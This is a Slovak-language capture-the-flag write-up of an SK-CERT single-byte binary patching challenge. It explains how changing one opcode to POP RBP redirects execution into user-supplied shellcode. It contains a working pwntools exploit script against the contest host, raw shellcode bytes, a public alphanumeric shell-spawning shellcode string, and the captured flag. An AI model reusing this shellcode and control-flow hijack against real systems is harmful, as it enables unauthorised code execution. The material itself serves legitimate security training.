# Zadanie

EN: Your infiltration of ByteBusters Inc. continues. Having bypassed their perimeter security and isolation protections, you've uncovered their bleeding-edge firmware patching system.

Can you craft the perfect patch to transform their innocent executable into a backdoor that will reveal their secrets? Flag is located in /flag.txt

SK: Tvoja infiltrácia spoločnosti ByteBusters Inc. pokračuje. Po prekonaní ich perimetrového zabezpečenia a izolačných ochrán si odhalil ich najmodernejší systém opravovania firmvéru.

Dokážeš vytvoriť dokonalú záplatu na premenu ich nevinného spustiteľného súboru na zadné vrátka, ktoré odhalia ich tajomstvá? Vlajka sa nachádza v /flag.txt

`exp.cybergame.sk:7007`

**Súbory:**

- docker-compose.yml
- Dockerfile
- chall
- run.py

## Riešenie

Táto potvora bola naopak najťažšia. Nie tým, že by bol kód nejaký komplikovaný, ale kvôli tomu, že to nemalo žiadne očividné riešenie.

Binárka je taká malá, že samotné jadro binárky tvorí len 52 bajtov. 

Čo sa vlastne deje na pozadí?

V princípe nám dá server možnosť patchnúť jeden bajt binárky predtým ako nám ju patchnutú spustí. Po pripojení od nás server žiada offset bajtu, ktorý chceme zmeniť, potom samotnú hodnotu bajtu a napokon argumenty, s ktorými chcem binárku spustiť. Samotná binárka, ale vlajku pred štartom nenačítava, takže nejaké čítanie stacku alebo podobne nám nepomôže a teda je viac než jasné, že argument budeme potrebovať. 

Vzerá to takto

```
=================================================
|  ByteBusters Secure Firmware Patching System  |
=================================================
Single-byte modification permitted for critical updates
Target byte offset for patch: 0x1111 (čokoľvek vrámci veľkosti binárky)
Replacement byte value: 0x00 (čokoľvek v rozahu 0x00 - 0xFF)
WARNING: Integrity check failed!
Execute anyway? Provide execution parameters:
akykolvek argument mozeme poskytnut
No flag here!        (a tento crap printne :D)
```

Čo binárka robí?

Zavolá funkciu `vuln()` tá cez syscall write printe na file deskriptor 1 (stdout) obsah zo sekcie .rodata z adresy 0x12000, tj. string `No flag here!\n`, vráti sa do entry funkcie, nastaví si rax register na `0x3c`, rdi na 0 a zavolá syscall, ktorý kedže je rax 0x3c, je to syscall `exit` a binárka sa ukončí.

Moje riešenie bol v prepísaní bajtu na offsete `0x100f` , kde som syscall opcode `0f 05`, konkréne `0f` zmenil na bajt `5d`, teda na `POP RBP`, čím teda nedošlo k exitu, ale posunutie adries na stacku a namiesto exitu sa program neukončí, ale pokračuje na ďalšej adrese, teda 0x11010, kde nám ostal bajt `55` z pôvodného opcode a kedže to nie je jednobajtova inštrukcia, zožrala bajty z vuln a zmenila defakto aj správanie binárky po skočení na túto adresu.

Namiesto povodných instrukcií 

```

00011000 e8 0c 00        CALL       vuln                                             undefined vuln()
         00 00
00011005 48 c7 c0        MOV        RAX,0x3c
         3c 00 00 00
0001100c 48 31 ff        XOR        RDI,RDI
0001100f 0f 05           SYSCALL

00011011 55              PUSH       RBP
00011012 89 e5           MOV        EBP,ESP
00011014 48 c7 c0        MOV        RAX,0x1
         01 00 00 00
0001101b 48 c7 c7        MOV        RDI,0x1
         01 00 00 00
00011022 48 8d 35        LEA        RSI,[message]                                    = "No flag here!\n"
         d7 0f 00 00
00011029 48 c7 c2        MOV        RDX,0xd
         0d 00 00 00
00011030 0f 05           SYSCALL
00011032 5d              POP        RBP
00011033 c3              RET

```

sa nám pokračovanie zmenilo na 

```
0001100f 5d              POP        RBP
00011010 05 55 89        ADD        EAX,0x48e58955
         e5 48
00011015 c7 c0 01        MOV        EAX,0x1
         00 00 00
0001101b 48 c7 c7        MOV        RDI,0x1
         01 00 00 00
00011022 48 8d 35        LEA        RSI,[message]                                    = "No flag here!\n"
         d7 0f 00 00
00011029 48 c7 c2        MOV        RDX,0xd
         0d 00 00 00
00011030 0f 05           SYSCALL
00011032 5d              POP        RBP
00011033 c3              RET
```

Ale tým, že sme zmenili inštrukcie a už nemáme pôvodný PUSH RBP (teda on tam stále je, ale iba vtedy sa vykoná, pokiaľ program zavoláme presne na adrese vuln funckie a to 0x11011) a teda sme nahradili 

```
0001100f 0f 05           SYSCALL

00011011 55              PUSH       RBP
00011012 89 e5           MOV        EBP,ESP
00011014 48 c7 c0        MOV        RAX,0x1
         01 00 00 00
```

týmto

```
0001100f 5d              POP        RBP
00011010 05 55 89        ADD        EAX,0x48e58955
         e5 48
00011015 c7 c0 01        MOV        EAX,0x1
         00 00 00
```

tak nám binárka od adresy 0x1100f pokračuje po novom takto a tým sa zavolaním `pop rbp` zoberie zo stacku vrchná hodnota a vloží sa do RBP, v tomto prípade teda argc. Funkcia `vuln` má však ešte jeden svoj `pop rbp`, takže sa do rbp dostane ďalšia hodnota zo stacku, tentoraz argv[0] (cesta k binárke). Po tomto druhom `pop rbp` ukazuje stack na argv[1], teda náš argument. Po vykonaní inštrukcie `ret` sa RIP nastaví práve na túto hodnotu, čiže na adresu, kde začína náš shellcode, ktorý sa následne vykoná.

Tu použijem opäť shellcraft, ale rovno  shellcraft.cat, pretože poznám cestu k vlajku.

Výsledný skript bude

```python
from pwn import *

context.clear(arch='amd64')
shellcode = asm(shellcraft.cat("/flag.txt"))

pwnio = remote("exp.cybergame.sk", 7007)
pwnio.sendlineafter(b"Target byte offset for patch:", b"0x100f")
pwnio.sendlineafter(b"Replacement byte value:", b'0x5d')
pwnio.sendlineafter(b"execution parameters:", shellcode)
print(pwnio.recvall(timeout=4).decode(errors="ignore"))
pwnio.close()

```

a výstup

```
[+] Opening connection to exp.cybergame.sk on port 7007: Done
[+] Receiving all data: Done (64B)
[*] Closed connection to exp.cybergame.sk port 7007

No flag here!No flag here!SK-CERT{n1c3_4lph4num3r1c_5h3llc0d3}
```

Vlajka síce hovorí o peknom alfanumerickom shellkóde, ale môj isto nebol čisto alfanumerický (konkrétne bol v hex `6a 74 48 b8 2f 66 6c 61 67 2e 74 78 50 6a 02 58 48 89 e7 31 f6 0f 05 41 ba ff ff ff 7f 48 89 c6 6a 28 58 6a 01 5f 99 0f 05` a už to, že sú tu bajty väčšie ako 0x7a, čo je posledný alfanumericý znak o tom hovorí), takže zrejme moje riešenie nie je pôvodný autorský zámer na riešenie :D

---

PS. Tak som si urobil research a skutočne existuje čisto alfanumerický shellcode, taký čo spawne shell, je to 

```asm
XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V
```

Proof of concept, kde som zada príkaz `cat /flag.txt`

```
=================================================
|  ByteBusters Secure Firmware Patching System  |
=================================================
Single-byte modification permitted for critical updates
Target byte offset for patch: 0x100f
Replacement byte value: 0x5d
WARNING: Integrity check failed!
Execute anyway? Provide execution parameters:
XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V
No flag here!No flag here!
cat /flag.txt
SK-CERT{n1c3_4lph4num3r1c_5h3llc0d3}
```



## Vlajka

```
SK-CERT{n1c3_4lph4num3r1c_5h3llc0d3}
```
